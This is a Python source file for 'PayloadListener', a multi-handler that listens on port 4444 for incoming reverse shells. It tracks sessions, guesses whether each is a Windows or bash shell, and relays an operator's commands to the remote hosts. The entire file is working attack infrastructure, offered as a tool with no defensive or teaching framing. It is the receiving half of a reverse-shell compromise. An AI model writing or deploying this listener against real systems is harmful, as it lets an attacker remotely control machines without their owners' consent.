"""
PayloadListener - Multi-handler for receiving reverse shells
Handles incoming connections from generated payloads
"""

import socket
import threading
import sys
from datetime import datetime
from colorama import Fore, Style, init

init(autoreset=True)

class PayloadListener:
    """Listen for incoming reverse shell connections"""
    
    def __init__(self, lhost='0.0.0.0', lport=4444):
        self.lhost = lhost
        self.lport = lport
        self.server_socket = None
        self.running = False
        self.sessions = {}
        self.session_counter = 0
        self.lock = threading.Lock()
    
    def start(self):
        """Start the multi-handler listener"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.lhost, self.lport))
            self.server_socket.listen(5)
            self.running = True
            
            print(f"{Fore.GREEN}[+] Listener started on {self.lhost}:{self.lport}")
            print(f"{Fore.YELLOW}[*] Waiting for incoming connections...")
            
            while self.running:
                try:
                    client_socket, client_address = self.server_socket.accept()
                    
                    with self.lock:
                        self.session_counter += 1
                        session_id = self.session_counter
                    
                    print(f"{Fore.GREEN}[+] New connection from {client_address[0]}:{client_address[1]} (Session {session_id})")
                    
                    # Store session
                    self.sessions[session_id] = {
                        'socket': client_socket,
                        'address': client_address,
                        'created': datetime.now(),
                        'type': self._detect_shell_type(client_socket)
                    }
                    
                    # Handle client in separate thread
                    client_thread = threading.Thread(
                        target=self._handle_client,
                        args=(session_id, client_socket, client_address),
                        daemon=True
                    )
                    client_thread.start()
                
                except KeyboardInterrupt:
                    self.stop()
                except Exception as e:
                    print(f"{Fore.RED}[-] Error accepting connection: {e}")
        
        except Exception as e:
            print(f"{Fore.RED}[-] Failed to start listener: {e}")
            self.running = False
    
    def _detect_shell_type(self, sock):
        """Detect the type of shell connected"""
        try:
            sock.settimeout(0.5)
            data = sock.recv(1024)
            sock.settimeout(None)
            
            if b'cmd.exe' in data or b'C:\\' in data:
                return 'windows_cmd'
            elif b'$' in data or b'#' in data:
                return 'bash'
            else:
                return 'unknown'
        except:
            return 'unknown'
    
    def _handle_client(self, session_id, client_socket, client_address):
        """Handle individual client session"""
        try:
            while self.running:
                # Get user input
                sys.stdout.write(f"\n{Fore.CYAN}[Session {session_id}] > {Style.RESET_ALL}")
                sys.stdout.flush()
                
                try:
                    command = sys.stdin.readline().strip()
                    
                    if not command:
                        continue
                    
                    if command.lower() == 'exit':
                        print(f"{Fore.YELLOW}[*] Closing session {session_id}")
                        break
                    
                    if command.lower() == 'background':
                        print(f"{Fore.YELLOW}[*] Backgrounding session {session_id}")
                        break
                    
                    # Send command to target
                    client_socket.send((command + '\n').encode())
                    
                    # Receive response
                    client_socket.settimeout(2)
                    response = b''
                    while True:
                        try:
                            chunk = client_socket.recv(4096)
                            if not chunk:
                                break
                            response += chunk
                        except socket.timeout:
                            break
                    
                    if response:
                        print(f"{Fore.GREEN}{response.decode('utf-8', errors='ignore')}{Style.RESET_ALL}", end='')
                
                except KeyboardInterrupt:
                    print(f"\n{Fore.YELLOW}[*] Backgrounding session {session_id}")
                    break
                except Exception as e:
                    print(f"{Fore.RED}[-] Error: {e}")
                    break
        
        except Exception as e:
            print(f"{Fore.RED}[-] Session error: {e}")
        
        finally:
            with self.lock:
                if session_id in self.sessions:
                    del self.sessions[session_id]
            client_socket.close()
            print(f"{Fore.YELLOW}[*] Session {session_id} closed")
    
    def list_sessions(self):
        """List all active sessions"""
        if not self.sessions:
            print(f"{Fore.YELLOW}[*] No active sessions")
            return
        
        print(f"\n{Fore.CYAN}Active Sessions:{Style.RESET_ALL}")
        print(f"{'ID':<5} {'Host':<20} {'Port':<6} {'Type':<15} {'Created':<20}")
        print("-" * 70)
        
        for sid, session in self.sessions.items():
            host = session['address'][0]
            port = session['address'][1]
            shell_type = session['type']
            created = session['created'].strftime('%Y-%m-%d %H:%M:%S')
            print(f"{sid:<5} {host:<20} {port:<6} {shell_type:<15} {created:<20}")
    
    def interact_session(self, session_id):
        """Interact with a specific session"""
        if session_id not in self.sessions:
            print(f"{Fore.RED}[-] Session {session_id} not found")
            return
        
        session = self.sessions[session_id]
        client_socket = session['socket']
        
        print(f"{Fore.GREEN}[+] Interacting with session {session_id} ({session['address'][0]}:{session['address'][1]})")
        print(f"{Fore.YELLOW}[*] Type 'exit' to disconnect\n")
        
        try:
            while True:
                sys.stdout.write(f"{Fore.CYAN}[{session_id}] > {Style.RESET_ALL}")
                sys.stdout.flush()
                
                command = sys.stdin.readline().strip()
                
                if not command:
                    continue
                
                if command.lower() == 'exit':
                    break
                
                # Send command
                client_socket.send((command + '\n').encode())
                
                # Receive response
                client_socket.settimeout(2)
                response = b''
                try:
                    while True:
                        chunk = client_socket.recv(4096)
                        if not chunk:
                            break
                        response += chunk
                except socket.timeout:
                    pass
                
                if response:
                    print(f"{Fore.GREEN}{response.decode('utf-8', errors='ignore')}{Style.RESET_ALL}", end='')
        
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[*] Disconnected from session {session_id}")
        except Exception as e:
            print(f"{Fore.RED}[-] Error: {e}")
    
    def kill_session(self, session_id):
        """Kill a specific session"""
        if session_id not in self.sessions:
            print(f"{Fore.RED}[-] Session {session_id} not found")
            return
        
        try:
            self.sessions[session_id]['socket'].close()
            del self.sessions[session_id]
            print(f"{Fore.GREEN}[+] Session {session_id} killed")
        except Exception as e:
            print(f"{Fore.RED}[-] Error killing session: {e}")
    
    def stop(self):
        """Stop the listener"""
        self.running = False
        
        # Close all sessions
        for sid, session in list(self.sessions.items()):
            try:
                session['socket'].close()
            except:
                pass
        
        # Close server socket
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass
        
        print(f"{Fore.YELLOW}[*] Listener stopped")
    
    def run_interactive(self):
        """Run listener in interactive mode"""
        listener_thread = threading.Thread(target=self.start, daemon=True)
        listener_thread.start()
        
        print(f"\n{Fore.CYAN}PayloadListener Interactive Mode{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Commands: list, interact <id>, kill <id>, exit{Style.RESET_ALL}\n")
        
        try:
            while True:
                try:
                    cmd = input(f"{Fore.CYAN}listener> {Style.RESET_ALL}").strip().split()
                    
                    if not cmd:
                        continue
                    
                    if cmd[0] == 'list':
                        self.list_sessions()
                    
                    elif cmd[0] == 'interact' and len(cmd) > 1:
                        try:
                            sid = int(cmd[1])
                            self.interact_session(sid)
                        except ValueError:
                            print(f"{Fore.RED}[-] Invalid session ID")
                    
                    elif cmd[0] == 'kill' and len(cmd) > 1:
                        try:
                            sid = int(cmd[1])
                            self.kill_session(sid)
                        except ValueError:
                            print(f"{Fore.RED}[-] Invalid session ID")
                    
                    elif cmd[0] == 'exit':
                        break
                    
                    else:
                        print(f"{Fore.YELLOW}[*] Unknown command")
                
                except KeyboardInterrupt:
                    break
        
        except Exception as e:
            print(f"{Fore.RED}[-] Error: {e}")
        
        finally:
            self.stop()


if __name__ == '__main__':
    import argparse
    
    parser = argparse.ArgumentParser(description='PayloadListener - Multi-handler')
    parser.add_argument('-l', '--lhost', default='0.0.0.0', help='Listen host (default: 0.0.0.0)')
    parser.add_argument('-p', '--lport', type=int, default=4444, help='Listen port (default: 4444)')
    
    args = parser.parse_args()
    
    listener = PayloadListener(args.lhost, args.lport)
    listener.run_interactive()
